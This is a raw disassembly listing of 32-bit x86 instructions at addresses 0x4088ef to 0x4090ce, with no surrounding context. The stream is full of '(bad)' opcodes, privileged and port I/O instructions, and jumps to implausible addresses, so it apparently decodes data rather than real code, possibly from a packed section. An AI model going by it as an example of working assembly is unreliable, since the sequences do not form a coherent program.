  4088ef:	push   esp
  4088f0:	dec    edx
  4088f1:	add    ah,BYTE PTR ds:0x60b255ab
  4088f7:	scas   eax,DWORD PTR es:[edi]
  4088f8:	pop    ds
  4088f9:	mov    ebp,0x53319a7
  4088fe:	push   eax
  4088ff:	sub    BYTE PTR [edx+0x27],bl
  408902:	pop    ebx
  408903:	adc    al,0x86
  408905:	cmp    al,0x54
  408907:	ror    DWORD PTR [ebx],1
  408909:	add    eax,0x7199933c
  40890e:	cs call 0x67427c95
  408914:	jne    0x40889a
  408916:	ss mov cl,0x53
  408919:	fs jns 0x4088bf
  40891c:	mov    ss,esp
  40891e:	bound  esi,QWORD PTR [eax-0x6d]
  408921:	in     al,dx
  408922:	xchg   DWORD PTR [esi],eax
  408924:	pop    eax
  408925:	imul   edx,DWORD PTR gs:[eax+ebp*1+0x314b4020],0x20
  40892e:	add    eax,0xb882801
  408933:	lods   eax,DWORD PTR ds:[esi]
  408934:	(bad)  
  408935:	call   0xee44a69f
  40893a:	test   eax,0x7a887b5b
  40893f:	lea    edx,[ebx-0x4f]
  408942:	jg     0x408921
  408944:	test   al,0x43
  408946:	dec    ebp
  408947:	enter  0xe5fd,0x4c
  40894b:	cmp    BYTE PTR [esi+0xf],cl
  40894e:	and    eax,0x41097ae1
  408953:	retf   0x7231
  408956:	xor    eax,DWORD PTR [edx]
  408958:	(bad)
  40895b:	mov    esi,DWORD PTR gs:[esp+0x1d71fda1]
  408963:	cmp    eax,0x4f88e12b
  408968:	add    al,0x2
  40896a:	xchg   ecx,eax
  40896b:	or     eax,DWORD PTR [esi]
  40896d:	test   DWORD PTR [edx-0x4e9a9edc],esi
  408973:	(bad)  
  408974:	enter  0x69f6,0x86
  408978:	ins    BYTE PTR es:[edi],dx
  408979:	jne    0x408917
  40897b:	int3   
  40897c:	fucomp st(0)
  40897f:	ret    0x5f62
  408982:	mov    esi,0xb3bd0d41
  408987:	xchg   esp,eax
  408988:	fidivr DWORD PTR [edx+eiz*4]
  40898b:	pop    edx
  40898c:	pushf  
  40898d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40898e:	add    BYTE PTR [ecx+0x2adb7e2c],dh
  408994:	sub    DWORD PTR [edx-0x3c8648bb],edi
  40899a:	fsubr  QWORD PTR [ebx+eax*4]
  40899d:	and    dh,BYTE PTR [edi-0x28b36487]
  4089a3:	cmp    al,0xfd
  4089a5:	mov    esp,0xc8dac1df
  4089aa:	stos   DWORD PTR es:[edi],eax
  4089ab:	gs push esp
  4089ad:	push   ebp
  4089ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089af:	and    eax,0x3cd839bd
  4089b4:	fdivr  st(2),st
  4089b6:	arpl   WORD PTR [esi-0x20711bd8],bx
  4089bc:	inc    esp
  4089bd:	std    
  4089be:	(bad)  
  4089bf:	dec    esp
  4089c0:	stos   DWORD PTR es:[edi],eax
  4089c1:	sub    DWORD PTR [ecx],edx
  4089c3:	jnp    0x4089b3
  4089c5:	adc    bh,BYTE PTR [esi+eiz*2-0x741205e0]
  4089cc:	adc    BYTE PTR [eax-0x68454614],0x1d
  4089d3:	test   al,0x86
  4089d5:	pop    ds
  4089d6:	jbe    0x408963
  4089d8:	cmp    ecx,edi
  4089da:	sti    
  4089db:	aam    0x1f
  4089dd:	test   al,0xb6
  4089df:	push   cs
  4089e0:	add    eax,0xb1ae1cf
  4089e5:	mov    al,ds:0xd1a0ff29
  4089ea:	adc    DWORD PTR [eax+0x2c],edx
  4089ed:	xlat   BYTE PTR ds:[ebx]
  4089ee:	daa    
  4089ef:	mov    ch,0xbf
  4089f1:	ror    BYTE PTR [edi+0x28],cl
  4089f4:	or     dh,BYTE PTR [ebx-0x1190750e]
  4089fa:	and    BYTE PTR [ebx-0x75c54a02],ch
  408a00:	test   BYTE PTR [ebx-0xb9fb064],al
  408a06:	and    al,0x82
  408a08:	popa   
  408a09:	sbb    eax,0xefe812b9
  408a0e:	inc    esp
  408a0f:	mov    ah,BYTE PTR [esp+ecx*1+0x2bd7952f]
  408a16:	ror    BYTE PTR [esp+esi*4-0x72],cl
  408a1a:	push   ss
  408a1b:	adc    ebp,DWORD PTR [ebx+0x3adda820]
  408a21:	add    DWORD PTR [ebx+0x42],edi
  408a24:	mov    ch,0xb7
  408a26:	ss (bad) 
  408a28:	cmp    DWORD PTR [esi],edi
  408a2a:	ins    DWORD PTR es:[edi],dx
  408a2b:	stos   DWORD PTR es:[edi],eax
  408a2c:	arpl   dx,sp
  408a2e:	aad    0xba
  408a30:	jnp    0x408a7d
  408a32:	and    eax,0x80333094
  408a37:	xor    eax,0xda318019
  408a3c:	test   BYTE PTR [ebx],ah
  408a3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a3f:	idiv   BYTE PTR [ebx]
  408a41:	or     DWORD PTR [ebx+0x7e54001d],esp
  408a47:	mov    bh,0x69
  408a49:	lea    ebx,[ebp-0x40]
  408a4c:	mov    eax,ds:0x2da493d2
  408a51:	addr16 mov ah,0x48
  408a54:	hlt    
  408a55:	and    dl,BYTE PTR [edx+0x5]
  408a58:	mov    edi,0x52497139
  408a5d:	cld    
  408a5e:	aaa    
  408a5f:	cmp    eax,0x2b46bb5e
  408a64:	pop    ss
  408a65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a66:	jg     0x408a41
  408a68:	mov    ebx,0x5b4d1610
  408a6d:	add    ch,0xdc
  408a70:	and    esi,0x471ac4ff
  408a76:	adc    dl,cl
  408a78:	fistp  QWORD PTR ds:0x93075d24
  408a7e:	mov    al,ds:0x5a38e9f6
  408a83:	adc    DWORD PTR [edi+eax*8-0x5e1ab08e],eax
  408a8a:	inc    ecx
  408a8b:	push   edx
  408a8c:	loopne 0x408a86
  408a8e:	fwait
  408a8f:	jbe    0x408a83
  408a91:	xchg   esi,eax
  408a92:	and    al,0x46
  408a94:	outs   dx,DWORD PTR ds:[esi]
  408a95:	jg     0x408a5f
  408a97:	ins    BYTE PTR es:[edi],dx
  408a98:	jae    0x408a72
  408a9a:	jb     0x408aab
  408a9c:	call   0xfc11:0x12ee86c4
  408aa3:	pop    ebp
  408aa4:	xchg   ecx,eax
  408aa5:	push   ebp
  408aa6:	push   edx
  408aa7:	loop   0x408b00
  408aa9:	lahf   
  408aaa:	jle    0x408a88
  408aac:	xor    eax,0x5b
  408aaf:	push   es
  408ab0:	test   BYTE PTR [ecx+0x95aeb74],0x99
  408ab7:	outs   dx,BYTE PTR ds:[esi]
  408ab8:	cli    
  408ab9:	(bad)
  408abc:	push   esi
  408abd:	out    0xce,al
  408abf:	and    BYTE PTR [ebx+esi*1],dh
  408ac2:	out    dx,al
  408ac3:	out    0xdf,al
  408ac5:	mov    eax,ds:0xba63b7f4
  408aca:	sahf   
  408acb:	sub    edi,DWORD PTR [eax-0x24a33cb7]
  408ad1:	outs   dx,DWORD PTR ds:[esi]
  408ad2:	mov    dh,0x95
  408ad4:	(bad)
  408ad7:	push   ds
  408ad8:	push   ds
  408ad9:	test   DWORD PTR [edx+0x54],ecx
  408adc:	lods   al,BYTE PTR ds:[esi]
  408add:	fsubr  st,st(5)
  408adf:	jecxz  0x408a8a
  408ae1:	jge    0x408b14
  408ae3:	(bad)  
  408ae4:	pusha  
  408ae5:	adc    esi,edx
  408ae7:	test   al,0x70
  408ae9:	cwde   
  408aea:	ret    
  408aeb:	es loope 0x408a7c
  408aee:	neg    ecx
  408af0:	xchg   DWORD PTR [ebp+0x12],ebx
  408af3:	retf   
  408af4:	(bad)  
  408af5:	sub    ebx,DWORD PTR [esi]
  408af7:	or     ah,BYTE PTR [eax-0x2e]
  408afa:	jb     0x408af5
  408afc:	or     bl,dl
  408afe:	das    
  408aff:	test   eax,0x3e41ad26
  408b04:	repz sbb eax,0x7c925275
  408b0a:	xchg   ch,dh
  408b0c:	aaa    
  408b0d:	cmp    cl,cl
  408b0f:	loope  0x408b30
  408b11:	test   eax,0x7289221c
  408b16:	fistp  WORD PTR [ecx-0x6b92a28a]
  408b1c:	nop
  408b1d:	inc    ecx
  408b1e:	je     0x408b0b
  408b20:	jb     0x408b77
  408b22:	xchg   edi,eax
  408b23:	cmp    al,0x71
  408b25:	and    bh,BYTE PTR [ebp-0x193739a4]
  408b2b:	mov    edi,ebp
  408b2d:	jp     0x408aca
  408b2f:	imul   eax,DWORD PTR [edx],0xfb50b12b
  408b35:	pop    ecx
  408b36:	sti    
  408b37:	scas   al,BYTE PTR es:[edi]
  408b38:	pop    es
  408b39:	rdmsr  
  408b3b:	inc    ecx
  408b3c:	vmwrite ebx,DWORD PTR [eax]
  408b3f:	and    BYTE PTR [edx+esi*8],ah
  408b42:	add    eax,0x6870b04d
  408b47:	dec    esp
  408b48:	or     BYTE PTR [edi],al
  408b4a:	xor    edx,edi
  408b4c:	or     al,0x12
  408b4e:	cmp    DWORD PTR [ecx+0x559d3f97],ebp
  408b54:	fimul  WORD PTR [esi]
  408b56:	xchg   edi,eax
  408b57:	mov    bh,0x16
  408b59:	mov    ds:0x44d37e3e,eax
  408b5e:	xchg   ebx,eax
  408b5f:	xor    al,0xa9
  408b61:	or     edi,DWORD PTR [edi]
  408b63:	je     0x408b9d
  408b65:	push   esp
  408b66:	push   ebx
  408b67:	adc    al,0xe1
  408b69:	and    eax,DWORD PTR [ecx+0x24]
  408b6c:	daa    
  408b6d:	fidivr WORD PTR [eax]
  408b6f:	dec    ecx
  408b70:	jecxz  0x408bdd
  408b72:	mov    bh,0xc5
  408b74:	xchg   esp,eax
  408b75:	test   BYTE PTR [ebx],ah
  408b77:	call   ecx
  408b79:	lea    esp,[eax]
  408b7b:	loope  0x408bd3
  408b7d:	xchg   ebx,eax
  408b7e:	push   DWORD PTR [ebp-0x9]
  408b81:	es adc al,0xa0
  408b84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b85:	adc    DWORD PTR [esi+esi*4-0x14],0xb999154e
  408b8d:	mov    cl,0x14
  408b8f:	and    al,0xe7
  408b91:	push   eax
  408b92:	mov    al,ds:0xf40ecef
  408b97:	addr16 sahf 
  408b99:	(bad)  
  408b9a:	sbb    BYTE PTR [ebx-0x60b96f7f],0xd4
  408ba1:	sbb    esi,DWORD PTR [edi]
  408ba3:	and    esi,edi
  408ba5:	xor    eax,0xcc98883
  408baa:	in     eax,0x8a
  408bac:	mov    dh,0x94
  408bae:	push   0xb8aa94ff
  408bb3:	push   edi
  408bb4:	stc    
  408bb5:	mov    al,ds:0xb7b30910
  408bba:	cmc    
  408bbb:	dec    eax
  408bbc:	shl    dh,0xdd
  408bbf:	or     ecx,DWORD PTR fs:[ebx-0x5ef4a81f]
  408bc6:	push   edi
  408bc7:	mov    gs,WORD PTR gs:[ebx]
  408bca:	ds aam 0x3b
  408bcd:	xor    DWORD PTR [ecx+ecx*8],0x885727b
  408bd4:	xchg   esi,eax
  408bd5:	rcl    DWORD PTR [ebx+0x1a250c03],cl
  408bdb:	pop    eax
  408bdc:	shl    DWORD PTR [eax+eax*2],cl
  408bdf:	(bad)  
  408be0:	pop    ebp
  408be1:	not    DWORD PTR [ebp-0x5642197d]
  408be7:	push   ecx
  408be8:	shl    BYTE PTR [edx+edx*2-0x59],cl
  408bec:	jns    0x408c16
  408bee:	sub    BYTE PTR [edx],al
  408bf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bf1:	xlat   BYTE PTR ds:[ebx]
  408bf2:	dec    ecx
  408bf3:	push   edx
  408bf4:	or     BYTE PTR [esi],dh
  408bf6:	jmp    0x408c00
  408bf8:	sbb    BYTE PTR [ebp-0x31],al
  408bfb:	in     eax,dx
  408bfc:	adc    edx,ecx
  408bfe:	cmp    BYTE PTR [eax],dh
  408c00:	jnp    0x408bd2
  408c02:	ret    
  408c03:	mov    bh,0x8b
  408c05:	retf   
  408c06:	dec    edx
  408c07:	xchg   esi,eax
  408c08:	in     al,0x14
  408c0a:	sub    ah,BYTE PTR [edx+0x6a]
  408c0d:	and    esi,DWORD PTR [esi+0xc4bddc0]
  408c13:	outs   dx,BYTE PTR ds:[esi]
  408c14:	sub    esp,DWORD PTR [edx+0x58c31b64]
  408c1a:	push   edi
  408c1b:	push   0x512f1369
  408c20:	pop    ebx
  408c21:	cwde   
  408c22:	jns    0x408bc8
  408c24:	mov    ds:0x78617559,al
  408c29:	or     BYTE PTR es:[edi-0xc054118],dl
  408c30:	in     al,dx
  408c31:	imul   edi,DWORD PTR [edi+0x7f029d75],0xffffffd3
  408c38:	mov    esi,DWORD PTR [ebx-0x4727f8ad]
  408c3e:	test   DWORD PTR [ebp-0x54183482],ebx
  408c44:	push   cs
  408c45:	xor    cl,al
  408c47:	mov    edx,0x8dce76d
  408c4c:	jb     0x408c80
  408c4e:	push   ebx
  408c4f:	je     0x408c3e
  408c51:	ss stos BYTE PTR es:[edi],al
  408c53:	fcomp  QWORD PTR [edx+0x50]
  408c56:	fcomp  DWORD PTR [ecx]
  408c58:	(bad)  
  408c59:	mov    ?,esp
  408c5b:	push   fs
  408c5d:	shr    DWORD PTR [ebp+0xb],1
  408c60:	sub    eax,0xe2deadc7
  408c65:	add    eax,0x16a96afc
  408c6a:	cmp    ebx,ecx
  408c6c:	add    al,BYTE PTR [esi-0x6b]
  408c6f:	mov    ecx,0xa9d41fc4
  408c74:	ror    DWORD PTR [ecx],0x32
  408c77:	mov    dh,0x8a
  408c79:	das    
  408c7a:	jns    0x408c7c
  408c7c:	xor    al,0x7f
  408c7e:	mov    eax,0x77b08684
  408c83:	adc    al,dl
  408c85:	lock loopne 0x408cc6
  408c88:	outs   dx,BYTE PTR ds:[esi]
  408c89:	xor    al,BYTE PTR [eax]
  408c8b:	iret   
  408c8c:	ret    
  408c8d:	mov    ?,WORD PTR [esi]
  408c8f:	mov    esi,DWORD PTR [eax-0x7834a9a7]
  408c95:	sub    dh,dl
  408c97:	push   0x2e58693a
  408c9c:	shl    DWORD PTR [ebx-0x6fa99e03],1
  408ca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ca3:	push   edi
  408ca4:	psubw  mm1,mm0
  408ca7:	dec    eax
  408ca8:	and    esi,DWORD PTR [eax+0x55]
  408cab:	mov    esi,0x75da4a1e
  408cb0:	cmp    DWORD PTR [edi+edi*4+0x84d3f13],edi
  408cb7:	cmp    ebp,DWORD PTR [eax]
  408cb9:	cmp    dl,bl
  408cbb:	cld    
  408cbc:	cmp    dl,BYTE PTR [edi+0x19f73b5c]
  408cc2:	out    dx,eax
  408cc3:	outs   dx,DWORD PTR ds:[esi]
  408cc4:	push   ds
  408cc5:	mov    eax,0x52a3345e
  408cca:	cwde   
  408ccb:	fs call 0xe547:0x66706459
  408cd3:	jnp    0x408ce6
  408cd5:	or     ah,BYTE PTR [ebp+0xc]
  408cd8:	pop    edx
  408cd9:	or     DWORD PTR [esi-0x63e60434],edi
  408cdf:	out    dx,eax
  408ce0:	xchg   ecx,eax
  408ce1:	call   0xcb8ddddd
  408ce6:	sbb    al,0xf7
  408ce8:	mul    DWORD PTR [ebx-0x36]
  408ceb:	or     ebx,esi
  408ced:	cmc    
  408cee:	sahf   
  408cef:	dec    esi
  408cf0:	popf   
  408cf1:	mov    esi,0xfc95d168
  408cf6:	arpl   WORD PTR [ecx],di
  408cf8:	adc    BYTE PTR [edx+0x6c1228e0],dl
  408cfe:	push   0xffffffc7
  408d00:	rcl    BYTE PTR [edi-0x59b0c97e],0x6c
  408d07:	cwde   
  408d08:	jmp    0xdd65:0xe2970b00
  408d0f:	jge    0x408cce
  408d11:	lea    ecx,cs:[esp+ebx*1+0x69]
  408d16:	push   esp
  408d17:	jae    0x408d32
  408d19:	dec    edx
  408d1a:	call   0x5f59455a
  408d1f:	cli    
  408d20:	das    
  408d21:	dec    di
  408d23:	and    BYTE PTR [ecx],dh
  408d25:	mov    eax,0xcdbd2ba0
  408d2a:	loope  0x408cfb
  408d2c:	pop    esi
  408d2d:	push   0xb1968bb3
  408d32:	xchg   esi,eax
  408d33:	add    ebp,edi
  408d35:	fbstp  TBYTE PTR [ecx+0x5f]
  408d38:	aad    0xf
  408d3a:	(bad)  
  408d3b:	inc    esp
  408d3c:	and    BYTE PTR [ecx-0x44ef35e9],dl
  408d42:	int3   
  408d43:	mov    ebx,0x74ac1bc5
  408d48:	mov    cs,esi
  408d4a:	xor    eax,0x22a6ffeb
  408d4f:	mov    ch,0x19
  408d51:	aad    0xb1
  408d53:	push   ds
  408d54:	inc    esi
  408d55:	fwait
  408d56:	push   esi
  408d57:	push   0xffffffa8
  408d59:	mov    esi,0x7f806272
  408d5e:	xchg   DWORD PTR [eax+0x20],edx
  408d61:	fucom  st(7)
  408d63:	hlt    
  408d64:	dec    esi
  408d65:	push   ss
  408d66:	pop    esp
  408d67:	pop    ebx
  408d68:	jg     0x408dc9
  408d6a:	jns    0x408d1d
  408d6c:	push   ecx
  408d6d:	icebp  
  408d6e:	adc    al,0x36
  408d70:	call   0xdab7c425
  408d75:	or     ebx,ecx
  408d77:	(bad)  [esp+eax*4+0x75fe1634]
  408d7e:	add    ecx,0x107ab379
  408d84:	push   ecx
  408d85:	retf   
  408d86:	je     0x408dd7
  408d88:	leave  
  408d89:	repz test DWORD PTR [eax-0x2957fdaa],0xad55e96e
  408d94:	and    al,0xec
  408d96:	inc    eax
  408d97:	test   bh,ch
  408d99:	sub    eax,0xa0f2184d
  408d9e:	test   BYTE PTR [eax-0x140638aa],0x6b
  408da5:	int3   
  408da6:	pop    esi
  408da7:	jne    0x408d4e
  408da9:	mov    eax,ds:0x4a2df3f8
  408dae:	mov    dh,0x89
  408db0:	mov    ecx,0x51e3452b
  408db5:	add    edi,edx
  408db7:	je     0x408e03
  408db9:	enter  0xf027,0xd0
  408dbd:	into   
  408dbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dbf:	sub    BYTE PTR [edi-0x70868ba9],al
  408dc5:	daa    
  408dc6:	aaa    
  408dc7:	xchg   esi,eax
  408dc8:	mov    ds:0x44f23a8c,eax
  408dcd:	or     BYTE PTR [ebp-0x35415b26],bh
  408dd3:	xchg   BYTE PTR [ebx],cl
  408dd5:	xor    al,0x9c
  408dd7:	outs   dx,BYTE PTR ds:[esi]
  408dd8:	add    ch,dl
  408dda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ddb:	push   ebp
  408ddc:	inc    esp
  408ddd:	lock enter 0x7846,0x19
  408de2:	push   cs
  408de3:	mov    esi,0xfa4d6563
  408de8:	fistp  WORD PTR [eax+0x5cb6a5f8]
  408dee:	sbb    al,0x0
  408df0:	xchg   ebp,eax
  408df1:	addr16 jno 0x408e36
  408df4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408df5:	cmp    BYTE PTR [eax],bl
  408df7:	int    0x2f
  408df9:	xchg   bh,ch
  408dfb:	test   BYTE PTR [edi+ebx*2],bl
  408dfe:	mov    esp,0xbdc1078d
  408e03:	lods   al,BYTE PTR ds:[esi]
  408e04:	ud2    
  408e06:	mov    bl,0x5f
  408e08:	xor    al,BYTE PTR [eax]
  408e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e0b:	lods   eax,DWORD PTR ds:[esi]
  408e0c:	pop    es
  408e0d:	dec    ecx
  408e0e:	pop    esp
  408e0f:	ins    DWORD PTR es:[edi],dx
  408e10:	jns    0x408ddb
  408e12:	sar    DWORD PTR [edx+0x90fe92f],1
  408e18:	mov    esp,0xa5a19c4
  408e1d:	mov    ecx,0xa1def1be
  408e22:	dec    esi
  408e23:	and    dh,ch
  408e25:	in     al,0x32
  408e27:	push   ss
  408e28:	mov    ?,WORD PTR [edx+edi*4]
  408e2b:	adc    edi,edi
  408e2d:	xchg   BYTE PTR [eax+0x1d37c16b],ah
  408e33:	(bad)  
  408e34:	push   esi
  408e36:	(bad)  
  408e37:	in     al,0x64
  408e39:	jmp    0x408e2d
  408e3b:	add    eax,0xa83e97bc
  408e40:	pop    esp
  408e41:	xchg   ebx,eax
  408e42:	jge    0x408e24
  408e44:	mov    esp,0x83b89988
  408e49:	dec    ecx
  408e4a:	inc    ebp
  408e4b:	sbb    al,0xc0
  408e4d:	xor    al,0x3c
  408e4f:	inc    esp
  408e51:	jp     0x408ded
  408e53:	test   DWORD PTR [edx-0x2a67cd73],0x60f61b34
  408e5d:	adc    al,0xc7
  408e5f:	stc    
  408e60:	mov    ch,0x5f
  408e62:	adc    al,0x2a
  408e64:	jmp    0xb818:0xf57f7c5b
  408e6b:	mov    WORD PTR [edx+0x3951fdc4],?
  408e71:	cli    
  408e72:	or     eax,0x63be628
  408e77:	scas   al,BYTE PTR es:[edi]
  408e78:	mov    al,ds:0xc8143b69
  408e7d:	pop    esp
  408e7e:	shr    BYTE PTR [ecx+ecx*8+0x5e2a41cf],0xd9
  408e86:	in     al,dx
  408e87:	frstor [edi+0x6962874]
  408e8d:	test   al,0x93
  408e8f:	ror    DWORD PTR [esi],1
  408e91:	mov    eax,0xe6bd3404
  408e96:	inc    esp
  408e97:	daa    
  408e98:	mov    cs:0x56a6542e,al
  408e9e:	shl    bh,cl
  408ea0:	pop    edi
  408ea1:	inc    esp
  408ea2:	mov    ecx,0xf993fc2e
  408ea7:	sbb    BYTE PTR [edi],dl
  408ea9:	loope  0x408eff
  408eab:	pop    ebp
  408eac:	dec    esp
  408ead:	jmp    0x408e97
  408eaf:	pop    esi
  408eb0:	es pop edi
  408eb2:	test   DWORD PTR [edi+0xd],0x8f023d9
  408eb9:	test   al,dl
  408ebb:	xchg   esi,eax
  408ebc:	popf   
  408ebd:	pop    edi
  408ebe:	jno    0x408f08
  408ec0:	imul   edx,DWORD PTR ds:0x9b171ff6,0xb9324a85
  408eca:	mov    es,WORD PTR [ebp+0x7dbfa2b7]
  408ed0:	dec    ebp
  408ed1:	out    0x2e,al
  408ed3:	lods   eax,DWORD PTR ds:[esi]
  408ed4:	mov    WORD PTR [ebp-0x2d],?
  408ed7:	sbb    ah,BYTE PTR [ecx]
  408ed9:	push   ecx
  408eda:	(bad)  
  408edb:	pop    esi
  408edc:	out    0x8,al
  408ede:	and    ebp,DWORD PTR [ebp-0x57]
  408ee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ee2:	mov    al,0x32
  408ee4:	dec    edx
  408ee5:	mov    cl,0x86
  408ee7:	mov    ds:0x168bd3e2,eax
  408eec:	fs inc ebx
  408eee:	xor    ah,BYTE PTR [eax]
  408ef0:	cmc    
  408ef1:	sbb    DWORD PTR [edi-0x1f],esi
  408ef4:	hlt    
  408ef5:	dec    edx
  408ef6:	cs ins DWORD PTR es:[edi],dx
  408ef8:	scas   eax,DWORD PTR es:[edi]
  408ef9:	ins    BYTE PTR es:[edi],dx
  408efa:	xchg   edx,eax
  408efb:	(bad)  
  408efc:	fisubr WORD PTR [ebx]
  408efe:	add    dh,BYTE PTR ds:0x85e0ebc1
  408f04:	inc    ebx
  408f05:	ins    BYTE PTR es:[edi],dx
  408f06:	cmp    BYTE PTR [edx+0x1c],ah
  408f09:	jl     0x408ea1
  408f0b:	inc    ecx
  408f0c:	retf   
  408f0d:	sbb    edi,eax
  408f0f:	jns    0x408ed5
  408f11:	mov    ecx,0x69d61016
  408f16:	enter  0xe845,0xe9
  408f1a:	dec    eax
  408f1b:	cmp    edx,edi
  408f1d:	mov    WORD PTR [edi-0x247d8836],?
  408f23:	cwde   
  408f24:	das    
  408f25:	dec    ecx
  408f26:	and    ecx,DWORD PTR [edx-0x1bb3f3a9]
  408f2c:	int    0x2f
  408f2e:	sbb    dl,BYTE PTR [edx]
  408f30:	jmp    0xd8b36323
  408f35:	pop    DWORD PTR [edx-0x186a273b]
  408f3b:	and    al,0x1d
  408f3d:	add    DWORD PTR [ebx+eiz*2],0x6d
  408f41:	cmp    ebx,DWORD PTR [ebx]
  408f43:	mov    esi,edi
  408f45:	ins    DWORD PTR es:[edi],dx
  408f46:	stc    
  408f47:	out    dx,eax
  408f48:	cmp    DWORD PTR [esi+0x2a],edx
  408f4b:	push   ds
  408f4c:	aad    0x19
  408f4e:	sti    
  408f4f:	fcmovne st,st(7)
  408f51:	sub    DWORD PTR [ebp-0x2c],0x9ec41969
  408f58:	lods   eax,DWORD PTR ds:[esi]
  408f59:	clc    
  408f5a:	or     al,0xcf
  408f5c:	xor    al,0x2c
  408f5e:	addr16 jns 0x408fce
  408f61:	data16 addr16 sbb al,0x0
  408f65:	xchg   edi,eax
  408f66:	or     ch,BYTE PTR [ecx-0x41357a7c]
  408f6c:	mov    edx,0x213ae8cd
  408f71:	jae    0x408f8e
  408f73:	or     BYTE PTR [edi],0xad
  408f76:	imul   edx,DWORD PTR [edi+0xc],0x261dde76
  408f7d:	mov    ah,0xdf
  408f7f:	enter  0x1302,0x99
  408f83:	jbe    0x408fad
  408f85:	jecxz  0x408fe3
  408f87:	aad    0x42
  408f89:	jae    0x408f36
  408f8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f8c:	jp     0x408f50
  408f8e:	test   al,0x6e
  408f90:	inc    ebx
  408f91:	pop    esi
  408f92:	aam    0x20
  408f94:	int    0x5f
  408f96:	je     0x408f59
  408f98:	mov    esi,0x6324474e
  408f9d:	(bad)  
  408f9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f9f:	mov    eax,ds:0x122221df
  408fa4:	ss adc eax,0x45f0992
  408faa:	fs and al,0xbb
  408fad:	lahf   
  408fae:	dec    ecx
  408faf:	lahf   
  408fb0:	inc    eax
  408fb1:	pop    es
  408fb2:	cs xchg ebx,eax
  408fb4:	scas   eax,DWORD PTR es:[edi]
  408fb5:	pushf  
  408fb6:	cmp    al,0x3
  408fb8:	sub    BYTE PTR [ecx-0xee915ce],dh
  408fbe:	adc    BYTE PTR [ecx+0x34],bl
  408fc1:	jecxz  0x408fb5
  408fc3:	imul   esi,edi,0xbec70b62
  408fc9:	cmp    al,BYTE PTR [ebp-0x65]
  408fcc:	inc    ebp
  408fcd:	test   al,0x6b
  408fcf:	adc    eax,0x642e8bb2
  408fd4:	adc    esp,DWORD PTR fs:[esi+0x7dee893]
  408fdb:	inc    eax
  408fdc:	out    0xb0,al
  408fde:	mov    cl,0x3c
  408fe0:	mov    ds:0xab4ab7e7,al
  408fe5:	pop    eax
  408fe6:	add    cl,bl
  408fe8:	rcr    DWORD PTR [ebp+0x27],1
  408feb:	cmp    esi,ecx
  408fed:	lods   eax,DWORD PTR ds:[esi]
  408fee:	dec    ecx
  408fef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ff0:	and    eax,0x2a56fc6e
  408ff5:	xor    dl,BYTE PTR [ebp+0x37ccaf4a]
  408ffb:	or     DWORD PTR [edi-0x63],ebp
  408ffe:	inc    eax
  408fff:	mov    esp,0x99507a3a
  409004:	out    0xa2,al
  409006:	shr    ah,0x73
  409009:	xchg   ebx,eax
  40900a:	push   es
  40900b:	jo     0x40907c
  40900d:	shl    bl,0x3d
  409010:	mov    esi,0x3c17647c
  409015:	fisttp WORD PTR [ecx+0x44b0619e]
  40901b:	adc    eax,0x88750448
  409020:	push   cs
  409021:	sar    BYTE PTR [edx],0x6e
  409024:	mov    cl,0x1f
  409026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409027:	mov    cl,0xeb
  409029:	cdq    
  40902a:	sbb    al,0x7c
  40902c:	adc    esi,DWORD PTR [ebp+ebx*4-0x5f58fdbe]
  409033:	push   ebp
  409034:	mov    bh,0xc4
  409036:	rcr    dh,cl
  409038:	xor    al,BYTE PTR [ecx+0x4e]
  40903b:	leave  
  40903c:	(bad)  
  40903d:	rcr    BYTE PTR [esi],1
  40903f:	shl    BYTE PTR [edx-0x48],1
  409042:	push   edi
  409043:	jg     0x408fd3
  409045:	jecxz  0x40901c
  409047:	(bad)  
  409048:	sti    
  409049:	mov    esp,0x4c1b716e
  40904e:	add    eax,0x92b0ee1d
  409053:	int    0xbb
  409055:	int    0xe6
  409057:	mov    esi,0xc5dbb7c4
  40905c:	fwait
  40905d:	mov    esp,0x823f5470
  409062:	cmp    ah,BYTE PTR [esi]
  409064:	sbb    BYTE PTR [ebx+eax*4],dh
  409067:	jl     0x408fed
  409069:	popf   
  40906a:	mov    eax,0x9db7c3b8
  40906f:	mov    DWORD PTR [esi+0x62],edx
  409072:	xor    esp,DWORD PTR [esi-0x12]
  409075:	pushf  
  409076:	das    
  409077:	hlt    
  409078:	out    dx,eax
  409079:	sub    eax,0xcfdea54b
  40907e:	pop    edx
  40907f:	retf   
  409080:	int    0x8e
  409082:	sub    ah,BYTE PTR [edx-0x1a]
  409085:	mov    esp,0x11e3d5b4
  40908a:	xchg   edi,eax
  40908b:	inc    edx
  40908c:	mov    edx,0xc6e53bd6
  409091:	adc    bl,BYTE PTR [eax-0x3c4952b5]
  409097:	cmp    dl,dl
  409099:	pop    ecx
  40909a:	dec    esp
  40909b:	fnstenv [edx]
  40909d:	cmp    al,0xbc
  40909f:	or     DWORD PTR [esi+0x4857f47f],0x51fb4176
  4090a9:	push   ss
  4090aa:	jg     0x409127
  4090ac:	es pop edx
  4090ae:	push   esp
  4090af:	std    
  4090b0:	xchg   ebx,eax
  4090b1:	sub    DWORD PTR [eax+esi*2-0x6d232e5b],ebp
  4090b8:	into   
  4090b9:	je     0x409062
  4090bb:	add    BYTE PTR [ecx-0x1b],al
  4090be:	leave  
  4090bf:	sbb    BYTE PTR [edx],cl
  4090c1:	pavgb  mm4,QWORD PTR [ebp+0x6b]
  4090c5:	sbb    al,0xba
  4090c7:	xlat   BYTE PTR gs:[ebx]
  4090c9:	add    al,0x30
  4090cb:	inc    edi
  4090cc:	jmp    0x4090a6
  4090ce:	es sub al,0x18
